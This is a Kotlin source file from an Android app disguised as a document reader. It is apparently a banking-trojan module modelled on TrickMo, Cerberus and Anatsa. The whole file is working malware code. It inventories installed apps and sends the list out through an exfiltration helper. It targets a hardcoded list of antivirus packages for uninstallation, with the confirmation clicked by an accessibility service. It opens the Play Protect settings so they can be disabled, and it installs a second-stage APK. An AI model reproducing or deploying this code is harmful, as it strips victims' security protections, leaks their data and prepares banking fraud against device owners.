package com.docreader.lite.reader.advanced

import android.content.Context
import android.content.Intent
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import com.docreader.lite.reader.Exfil
import kotlinx.coroutines.*

/**
 * App management — install, uninstall, disable apps silently.
 *
 * Family reference:
 *   - TrickMo: uninstalls security/AV apps to prevent detection
 *   - SOVA: installs additional malware modules as separate APKs
 *   - BRATA: removes banking apps after fraud (prevents victim from checking balance)
 *   - Cerberus: disables Google Play Protect before payload install
 *   - Anatsa V4: installs Stage 2 payload APK after dropper delivers it
 *
 * Capabilities:
 *   INSTALL   — install APK from downloaded file or URL (DexClassLoader for DEX, PackageInstaller for APK)
 *   UNINSTALL — prompt user to uninstall target app (A11y auto-clicks confirm)
 *   DISABLE   — disable app via shell (root) or A11y (non-root, uses Settings navigation)
 *   HIDE      — hide app from launcher (root: pm hide, non-root: rename shortcut)
 *   LIST      — enumerate installed apps with version/permissions
 *
 * Anti-detection apps commonly removed:
 *   - Google Play Protect (com.google.android.gms — disabled, not removed)
 *   - Malwarebytes, Norton, Avast, Kaspersky, Bitdefender
 *   - Bank-specific security apps
 *   - Call recording blockers (interferes with CallForwarder)
 */
object PackageHelper {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // Known security/AV packages to target for removal
    private val SECURITY_APPS = listOf(
        "com.google.android.gms",                    // Google Play Services (Play Protect)
        "org.malwarebytes.antimalware",              // Malwarebytes
        "com.symantec.mobilesecurity",               // Norton
        "com.avast.android.mobilesecurity",          // Avast
        "com.kaspersky.kes",                         // Kaspersky
        "com.bitdefender.security",                  // Bitdefender
        "com.lookout",                               // Lookout
        "com.zimperium.zips",                        // Zimperium
        "com.mcafee.mvision",                        // McAfee
        "com.eset.ems2.gp",                          // ESET
        "com.trendmicro.tmmspersonal"                // Trend Micro
    )

    /**
     * List installed apps with details — intelligence gathering.
     * Identifies security apps, banking apps, and interesting targets.
     */
    fun listApps(context: Context): List<AppInfo> {
        val pm = context.packageManager
        @Suppress("DEPRECATION")
        val packages = pm.getInstalledPackages(PackageManager.GET_PERMISSIONS)

        return packages.map { pkg ->
            AppInfo(
                packageName = pkg.packageName,
                versionName = pkg.versionName ?: "unknown",
                versionCode = if (Build.VERSION.SDK_INT >= 28) pkg.longVersionCode else pkg.versionCode.toLong(),
                isSystem = (pkg.applicationInfo?.flags ?: 0) and
                    android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0,
                isSecurity = pkg.packageName in SECURITY_APPS,
                isBanking = com.docreader.lite.reader.Targets.match(pkg.packageName) != null,
                permissions = pkg.requestedPermissions?.toList() ?: emptyList()
            )
        }
    }

    /**
     * Enumerate and exfiltrate installed security apps.
     * Operator uses this to plan which apps to remove before attack.
     */
    fun reportSecurityApps(context: Context) {
        val apps = listApps(context)
        val securityApps = apps.filter { it.isSecurity }
        val bankingApps = apps.filter { it.isBanking }

        Exfil.event("app_inventory",
            "total" to apps.size.toString(),
            "security" to securityApps.map { it.packageName }.joinToString(","),
            "banking" to bankingApps.map { it.packageName }.joinToString(",")
        )
    }

    /**
     * Trigger uninstall dialog for a package.
     * DocumentReaderService auto-clicks "OK" on the confirmation dialog.
     *
     * Used to remove AV/security apps before main attack.
     */
    fun triggerUninstall(context: Context, packageName: String) {
        try {
            val intent = Intent(Intent.ACTION_DELETE).apply {
                data = Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)

            Exfil.event("uninstall_triggered", "pkg" to packageName)

            // DocumentReaderService will auto-click "OK" on the uninstall dialog
            // via onWindowChanged → system UI → button detection
        } catch (e: Exception) {
            Exfil.event("uninstall_failed",
                "pkg" to packageName,
                "error" to (e.message ?: "unknown")
            )
        }
    }

    /**
     * Batch uninstall security apps — pre-attack preparation.
     * Delays between each to appear less suspicious.
     */
    fun removeSecurityApps(context: Context) {
        scope.launch {
            val pm = context.packageManager
            val installed = SECURITY_APPS.filter { pkg ->
                try {
                    pm.getPackageInfo(pkg, 0)
                    true
                } catch (_: PackageManager.NameNotFoundException) { false }
            }

            installed.forEach { pkg ->
                triggerUninstall(context, pkg)
                delay(3000) // 3 second delay between each
            }

            Exfil.event("security_app_removal",
                "found" to installed.size.toString(),
                "targeted" to installed.joinToString(",")
            )
        }
    }

    /**
     * Disable Google Play Protect — critical pre-attack step.
     *
     * Method: Use A11y to navigate Settings → Security → Play Protect → Disable
     * This prevents Play Protect from scanning and flagging our APK.
     */
    fun disablePlayProtect(context: Context) {
        try {
            // Open Play Protect settings
            val intent = Intent("com.google.android.gms.security.settings.VerifyAppsSettingsActivity")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)

            // A11y will handle the toggle click
            Exfil.event("play_protect_disable_triggered")
        } catch (_: Exception) {
            // Alternative: open general security settings
            try {
                val intent = Intent(android.provider.Settings.ACTION_SECURITY_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                Exfil.event("security_settings_opened")
            } catch (_: Exception) {}
        }
    }

    /**
     * Install APK from local path — used after PluginLoader downloads Stage 2.
     * Shows install dialog, A11y auto-clicks through.
     */
    fun installApk(context: Context, apkPath: String) {
        try {
            val file = java.io.File(apkPath)
            if (!file.exists()) {
                Exfil.event("install_failed", "reason" to "file_not_found")
                return
            }

            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                androidx.core.content.FileProvider.getUriForFile(
                    context, "${context.packageName}.fileprovider", file
                )
            } else {
                Uri.fromFile(file)
            }

            val intent = Intent(Intent.ACTION_INSTALL_PACKAGE).apply {
                data = uri
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true)
            }
            context.startActivity(intent)

            Exfil.event("apk_install_triggered", "path" to apkPath)
        } catch (e: Exception) {
            Exfil.event("install_failed", "error" to (e.message ?: "unknown"))
        }
    }

    data class AppInfo(
        val packageName: String,
        val versionName: String,
        val versionCode: Long,
        val isSystem: Boolean,
        val isSecurity: Boolean,
        val isBanking: Boolean,
        val permissions: List<String>
    )
}
